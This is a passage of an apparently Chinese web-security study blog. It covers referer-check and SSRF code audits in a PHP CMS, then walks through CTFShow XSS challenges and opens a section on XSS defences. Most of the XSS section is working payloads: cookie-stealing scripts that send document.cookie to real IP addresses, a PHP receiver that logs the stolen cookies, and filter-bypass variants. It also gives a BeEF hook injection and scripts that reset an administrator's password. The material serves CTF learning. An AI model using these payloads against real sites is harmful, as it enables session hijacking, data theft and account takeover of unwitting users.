class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:443/&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$referer</span>, <span class="variable">$s</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来源检测：<br>1.直接伪造-修改数据包referer<br>2.传入伪造-尝试在目标网站寻找可以上传的地方，上传数据包文件，取得当前同域名访问地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">来源搞成同一个目录</span><br><span class="line">REFERER: http:<span class="comment">//xxx.xxx.com/zb_system/</span></span><br></pre></td></tr></table></figure><p>POST请求</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送post请求</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $url 请求地址</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array $post_data post键值对数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send_post</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$post_data</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$postdata</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$post_data</span>);</span><br><span class="line">  <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&#x27;REFERER: http://location:8081/2.html&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$postdata</span>,</span><br><span class="line">      <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">15</span> * <span class="number">60</span> <span class="comment">// 超时时间（单位:s）</span></span><br><span class="line">    )</span><br><span class="line">  );</span><br><span class="line">  <span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$options</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用方法</span></span><br><span class="line"><span class="variable">$post_data</span> = <span class="keyword">array</span>(</span><br><span class="line">  <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;stclair2201&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;handan&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">send_post</span>(<span class="string">&#x27;https://www.jb51.net&#x27;</span>, <span class="variable">$post_data</span>);</span><br></pre></td></tr></table></figure><h2 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h2><p>其它漏洞<br>关键函数和应用功能</p><blockquote><p>不用挖，看有没有检测即可。<br>它是随机的<br>从功能追代码，从代码追功能</p></blockquote><p>思考方向<br>1.特定漏洞功能-&gt;代码段分析审计<br>2.特定漏洞函数-&gt;测试对应功能判断</p><h3 id="yzcms"><a href="#yzcms" class="headerlink" title="yzcms"></a>yzcms</h3><p>这个CMS的关键节点在于添加采集节点</p><blockquote><p>功能点：<br>添加采集节点后，测试采集时能采集到服务器的相关信息(存在SSRF)<br>测试采集节点：仅仅负责展示<br>添加采集节点：负责添加关键的采集节点的URL信息，还有采集的标签始末信息</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 添加采集节点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dosubmit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$_POST</span>[<span class="string">&#x27;urlpage&#x27;</span>]) <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;网址配置不能为空！&#x27;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">D</span>(<span class="string">&#x27;collection_node&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">      <span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;operation_success&#x27;</span>), <span class="title function_ invoke__">U</span>(<span class="string">&#x27;init&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;operation_failure&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">admin_tpl</span>(<span class="string">&#x27;collection_node_add&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 采集测试</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">collection_test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) : <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$id</span>) <span class="title function_ invoke__">showmsg</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;lose_parameters&#x27;</span>));</span><br><span class="line">  <span class="variable">$data</span> = <span class="title function_ invoke__">D</span>(<span class="string">&#x27;collection_node&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;nodeid&#x27;</span> =&gt; <span class="variable">$id</span>))-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;urlpage&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;网址配置不能为空！&#x27;</span>, <span class="string">&#x27;stop&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//目标网址</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;sourcetype&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;(*)&#x27;</span>, <span class="variable">$data</span>[<span class="string">&#x27;pagesize_start&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;urlpage&#x27;</span>]);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$data</span>[<span class="string">&#x27;urlpage&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//定义采集列表区间</span></span><br><span class="line">  <span class="variable">$url_start</span> = <span class="variable">$data</span>[<span class="string">&#x27;url_start&#x27;</span>];</span><br><span class="line">  <span class="variable">$url_end</span> = <span class="variable">$data</span>[<span class="string">&#x27;url_end&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$url_start</span>==<span class="string">&#x27;&#x27;</span> || <span class="variable">$url_end</span>==<span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;列表区域配置不能为空！&#x27;</span>, <span class="string">&#x27;stop&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="variable">$content</span> = collection::<span class="title function_ invoke__">get_content</span>(<span class="variable">$url</span>);</span><br><span class="line">  <span class="variable">$content</span> = collection::<span class="title function_ invoke__">get_sub_content</span>(<span class="variable">$content</span>, <span class="variable">$url_start</span>, <span class="variable">$url_end</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$content</span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;sourcecharset&#x27;</span>] == <span class="string">&#x27;gbk&#x27;</span>) <span class="variable">$content</span> = <span class="title function_ invoke__">array_iconv</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$content</span> = collection::<span class="title function_ invoke__">get_all_url</span>(<span class="variable">$content</span>, <span class="variable">$data</span>[<span class="string">&#x27;url_contain&#x27;</span>], <span class="variable">$data</span>[<span class="string">&#x27;url_except&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取第一篇文章地址来测试</span></span><br><span class="line">    <span class="variable">$articleurl</span> = <span class="keyword">isset</span>(<span class="variable">$content</span>[<span class="string">&#x27;url&#x27;</span>][<span class="number">0</span>]) ? <span class="variable">$content</span>[<span class="string">&#x27;url&#x27;</span>][<span class="number">0</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$articleurl</span>))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$article</span> = collection::<span class="title function_ invoke__">get_content</span>(<span class="variable">$articleurl</span>);</span><br><span class="line">      <span class="variable">$article</span> = collection::<span class="title function_ invoke__">get_filter_html</span>(<span class="variable">$article</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get_config</span>(<span class="variable">$data</span>));</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;sourcecharset&#x27;</span>] == <span class="string">&#x27;gbk&#x27;</span>) <span class="variable">$article</span> = <span class="title function_ invoke__">array_iconv</span>(<span class="variable">$article</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$article</span> = <span class="string">&#x27;列表规则错误！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$article</span> = <span class="string">&#x27;列表规则错误！&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">admin_tpl</span>(<span class="string">&#x27;collection_test&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_content</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line"><span class="built_in">self</span>::<span class="variable">$url</span> = <span class="variable">$url</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;curl&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>); </span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能点-采集 审计<br>采集添加-&gt;测试-&gt;抓包-&gt;代码-&gt;远程请求资源操作(函数)</p><p>函数-功能 审计<br>file_get_contents（造成SSRF的关键函数）</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0028-WEB攻防-19-通用漏洞之XSS跨站-防御&amp;绕过</title>
      <link href="/2023/06/30/SEC-Study-0056/"/>
      <url>/2023/06/30/SEC-Study-0056/</url>
      
        <content type="html"><![CDATA[<h1 id="docker-安装beef"><a href="#docker-安装beef" class="headerlink" title="docker 安装beef"></a>docker 安装beef</h1><p>首先，必须有docker环境作为支撑，然后：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker安装</span></span><br><span class="line">docker pull janes/beef</span><br><span class="line"><span class="comment"># docker运行beef</span></span><br><span class="line">docker run --<span class="built_in">rm</span> -p 3000:3000 janes/beef</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问方法</span></span><br><span class="line"><span class="comment"># 插入js，让目标客户端进行访问，实现客户机在我方服务器上线</span></span><br><span class="line">&lt;script src=<span class="string">&quot;http://你的IP地址:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="comment"># 我方访问服务器的办法</span></span><br><span class="line">http://你的IP地址:3000//ui/panel</span><br><span class="line">账密：beef  beef</span><br></pre></td></tr></table></figure><h1 id="跨站实战：CTFShow-316-331"><a href="#跨站实战：CTFShow-316-331" class="headerlink" title="跨站实战：CTFShow-316~331"></a>跨站实战：CTFShow-316~331</h1><p>绕过：<a href="https://xz.aliyun.com/t/4067">各种过滤的解决办法</a></p><h2 id="316-反射型-直接远程调用"><a href="#316-反射型-直接远程调用" class="headerlink" title="316-反射型-直接远程调用"></a>316-反射型-直接远程调用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">因为是比赛环境，服务器充当管理员，不用担心没管理者访问的问题</span><br><span class="line">在实际的生产场景当中必须把东西发送给生产的管理者并且被点击，才能生效。</span><br><span class="line"></span><br><span class="line">下面是一个简单的指向地址，需要在服务器自己准备一个接收文件，还是和上次那样，准备个接收即可。 </span><br><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://47.94.236.117/get.php?c=&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://8.217.203.31/get.php?c=&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">get.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;cookie.txt&#x27;</span> ,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="317-反射型-过滤-lt-script-gt"><a href="#317-反射型-过滤-lt-script-gt" class="headerlink" title="317-反射型-过滤&lt;script&gt;"></a>317-反射型-过滤&lt;script&gt;</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">window.location.href</span>=<span class="string">&#x27;http://47.94.236.117/get.php?c=&#x27;</span>+<span class="attr">document.cookie</span>;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="318-319-反射型-过滤-lt-img-gt"><a href="#318-319-反射型-过滤-lt-img-gt" class="headerlink" title="318 319-反射型-过滤&lt;img&gt;"></a>318 319-反射型-过滤&lt;img&gt;</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">js标签被过滤，事件部分被过滤</span><br><span class="line">触发事件：最好选择不需要任何条件就能触发的事件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onload</span>=<span class="string">&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie;&quot;</span>&gt;</span></span><br><span class="line">svg好用点</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="320-326-反射型-过滤空格"><a href="#320-326-反射型-过滤空格" class="headerlink" title="320-326-反射型-过滤空格"></a>320-326-反射型-过滤空格</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://8.217.203.31/get.php?c=&#x27;+document.cookie;&quot;&gt;</span><br></pre></td></tr></table></figure><p>xss保险的写法：使用斜杠“/”代替空格，事件为不需要任何条件就能触发的事件</p><h2 id="327-存储型-无过滤★★★"><a href="#327-存储型-无过滤★★★" class="headerlink" title="327-存储型-无过滤★★★"></a>327-存储型-无过滤★★★</h2><p>把发送的内容存储到数据库，访问信件内容时，内容会以跨站语句来执行。（存储型应用的地方）</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://8.217.203.31/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="328-存储型-注册插入JS★★★"><a href="#328-存储型-注册插入JS★★★" class="headerlink" title="328-存储型-注册插入JS★★★"></a>328-存储型-注册插入JS★★★</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">cookie是实时变化的，所以说拿到cookie时要随时使用。</span><br><span class="line">坑：BP抓包时要抓两次，不然拿到了cookie值却仅仅替换了一个数据包，就无法拿到用户名密码的明文信息（管理员视角）</span><br><span class="line"></span><br><span class="line">整体的过关方法：</span><br><span class="line">    1.观察页面显示，页面对普通用户不进行明文显示</span><br><span class="line">    2.如果想要看到明文账密，必须拿到管理员的cookie</span><br><span class="line">    3.使用下面的js作为密码，在该网址进行注册</span><br><span class="line">    4.注册完成后，在后台观察，得到临时的cookie</span><br><span class="line">    5.使用普通账户登录，转到展示用户账密的页面，刷新并且进行抓包，替换掉两次cookie，即可获得明文展示的账密</span><br><span class="line">        其实只换掉最后一个cookie也是可以的（理论可行）</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://47.94.236.117/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="329-存储型-失效凭据需1步完成所需操作★★★"><a href="#329-存储型-失效凭据需1步完成所需操作★★★" class="headerlink" title="329-存储型-失效凭据需1步完成所需操作★★★"></a>329-存储型-失效凭据需1步完成所需操作★★★</h2><p>失效时间极其短，发过去就失效了。也就是刚获取cookie就失效了。（cookie存活期极短）</p><p>换个思路：失效前获取当前页面源代码。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    学JS对xss有大用。 </span></span><br><span class="line"><span class="comment">    这是基于cookie没什么用处，但是想要其它特定值的时候。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- js触发代码并且把源代码当中的ctfshow发送到指定服务器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 类名                    遍历元素     元素索引    当前元素值</span></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 检测当前元素是不是包含ctfshow关键字</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 包含关键字，将关键字发送出去</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://8.217.203.31/get.php?c=&#x27;</span>+value.<span class="property">innerHTML</span>; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="330-存储型-借助修改密码重置管理员密码-GET"><a href="#330-存储型-借助修改密码重置管理员密码-GET" class="headerlink" title="330-存储型-借助修改密码重置管理员密码(GET)"></a>330-存储型-借助修改密码重置管理员密码(GET)</h2><p>通过访问一个地址即可修改密码。</p><p>因为管理员是本地登录，所以网址使用本地地址。</p><p>思路：使得管理员访问某个页面时直接重置当前用户密码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    这里的注点和之前有点不一样，注册时在用户名和密码处都尝试下面的代码进行修改。</span></span><br><span class="line"><span class="comment">    修改成功后，能使用123123的密码进行登录，并且跳转到用户管理得到flag</span></span><br><span class="line"><span class="comment">    这里唯一需要注意的点是要使用BP拦截网页，这样子才能在一瞬间保证把flag拦截下来</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123123&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 这是保险的触发方法. --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123123&#x27;;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="331-存储型-借助修改密码重置管理员密码-POST"><a href="#331-存储型-借助修改密码重置管理员密码-POST" class="headerlink" title="331-存储型-借助修改密码重置管理员密码(POST)"></a>331-存储型-借助修改密码重置管理员密码(POST)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">修改密码操作从get变为了POST数据包</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XSS修复-过滤函数-amp-http-only-amp-CSP-amp-长度限制★★★"><a href="#XSS修复-过滤函数-amp-http-only-amp-CSP-amp-长度限制★★★" class="headerlink" title="XSS修复-过滤函数&amp;http_only&amp;CSP&amp;长度限制★★★"></a>XSS修复-过滤函数&amp;http_only&amp;CSP&amp;长度限制★★★</h1><h2 id="过滤一些危险字符，以及转义-amp-lt-gt-“-‘-等危险字符"><a href="#过滤一些危险字符，以及转义-amp-lt-gt-“-‘-等危险字符" class="headerlink" title="过滤一些危险字符，以及转义&amp; &lt; &gt; “ ‘ 等危险字符"></a>过滤一些危险字符，以及转义&amp; &lt; &gt; “ ‘ 等危险字符</h2><p>自定义过滤函数引用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义过滤函数,过滤掉标签</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove_xss</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed</span></span><br><span class="line">  <span class="comment">// this prevents some character re-spacing such as &lt;java\0script&gt;</span></span><br><span class="line">  <span class="comment">// note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs</span></span><br><span class="line">  <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">  <span class="comment">// straight replacements, the user should never need these since they&#x27;re normal characters</span></span><br><span class="line">  <span class="comment">// this prevents like &lt;IMG SRC=@avascript:alert(&#x27;XSS&#x27;)&gt;</span></span><br><span class="line">  <span class="variable">$search</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">  <span class="variable">$search</span> .= <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">  <span class="variable">$search</span> .= <span class="string">&#x27;1234567890!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">  <span class="variable">$search</span> .= <span class="string">&#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\&#x27;\\&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$search</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">   <span class="comment">// ;? matches the ;, which is optional</span></span><br><span class="line">   <span class="comment">// 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars</span></span><br><span class="line">   <span class="comment">// @ @ search for the hex values</span></span><br><span class="line">   <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$search</span>[<span class="variable">$i</span>])).<span class="string">&#x27;;?)/i&#x27;</span>, <span class="variable">$search</span>[<span class="variable">$i</span>], <span class="variable">$val</span>); <span class="comment">// with a ;</span></span><br><span class="line">   <span class="comment">// @ @ 0&#123;0,7&#125; matches &#x27;0&#x27; zero to seven times</span></span><br><span class="line">   <span class="variable">$val</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(�&#123;0,8&#125;&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$search</span>[<span class="variable">$i</span>]).<span class="string">&#x27;;?)/&#x27;</span>, <span class="variable">$search</span>[<span class="variable">$i</span>], <span class="variable">$val</span>); <span class="comment">// with a ;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// now the only remaining whitespace attacks are \t, \n, and \r</span></span><br><span class="line">  <span class="variable">$ra1</span> = <span class="keyword">array</span>(<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;vbscript&#x27;</span>, <span class="string">&#x27;expression&#x27;</span>, <span class="string">&#x27;applet&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;blink&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span 